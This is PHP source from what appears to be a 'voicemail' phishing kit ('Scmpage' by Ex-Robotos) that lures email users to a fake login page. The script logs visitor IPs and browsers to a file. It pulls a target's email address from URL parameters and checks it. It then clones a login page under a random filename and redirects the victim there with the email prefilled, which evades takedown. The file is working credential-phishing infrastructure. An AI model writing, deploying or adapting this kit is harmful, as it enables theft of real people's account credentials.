<?php
/* 
Voicemail Scmpage 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/
error_reporting(0);include('blocker.php');include('config.php');

function RndString($length = 50) {
return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}
$randpart = RndString(50).''.RndString(50).''.RndString(50);


/* Visitor Result */
$visitorIP = getenv("REMOTE_ADDR");$visitorUA = $_SERVER['HTTP_USER_AGENT'];$visitorDATE = date("D M d, Y g:i a");
$logs = "
+ -------------Voicemail 2019 New Scmpage by Ex-Robotos------------+
| Visitor Information
| IP Address: $visitorIP
| Browser: $visitorUA
| Date: $visitorDATE 
+ --------------------------------------------------------------+
";
$file=fopen("./data.txt","a"); fwrite($file,$logs);fclose($file);


/* Grab Email */

if (isset($_GET['email'])) {$data = $_GET['email'];}
elseif (isset($_GET['data'])) {$data = $_GET['data'];}
elseif (isset($_GET['target'])) {$data = $_GET['target'];}
elseif (isset($_GET['code'])) {$data = urldecode($_GET['code']);}
elseif (preg_match("/[^\/]+$/", $_SERVER[ "REQUEST_URI" ])){preg_match("/[^\/]+$/", $_SERVER[ "REQUEST_URI" ], $matches);$data = $matches[0];}
else {die(header("Location: ".$FailRedirect));}

if ( base64_encode(base64_decode($data)) === $data){
    $email = base64_decode($data);
    
 // Remove all illegal characters from email
$email = filter_var($email, FILTER_SANITIZE_EMAIL);

// Validate e-mail
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die(header("Location: ".$FailRedirect));
}  
    
    
} else {
    $email = $data;
    
 // Remove all illegal characters from email
$email = filter_var($email, FILTER_SANITIZE_EMAIL);

// Validate e-mail
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die(header("Location: ".$FailRedirect));
}      
    
    
}
$linkSite = $_SERVER["HTTP_HOST"];$uriSite = $_SERVER["REQUEST_URI"];
$relative_path = dirname($_SERVER['PHP_SELF']);
if(isset($base64encodeData) && ($base64encodeData===false || $base64encodeData==="false" || $base64encodeData==="FALSE" || $base64encodeData==="False")){
$data = $email;
}else {
$data = base64_encode($email);
}
$dir =  getcwd();
if ($handle = opendir($dir)) {while (false !== ($entry = readdir($handle))) {$len = strlen($entry);
if($len == 28){rename($entry, "login.php");}}}$staticfile = "login.php";$name =  RndString(24);$exrobotos = $name.".php";
if (!copy($staticfile, $exrobotos)) {}else {if(file_exists($exrobotos)){
    if (isset($IsVoiceMail)&&$IsVoiceMail===true){$data .= '&type=VoiceMail';}
    /*unlink($staticfile);*/header("Location: $relative_path/$exrobotos?$randpart&data=$data");}}
?>
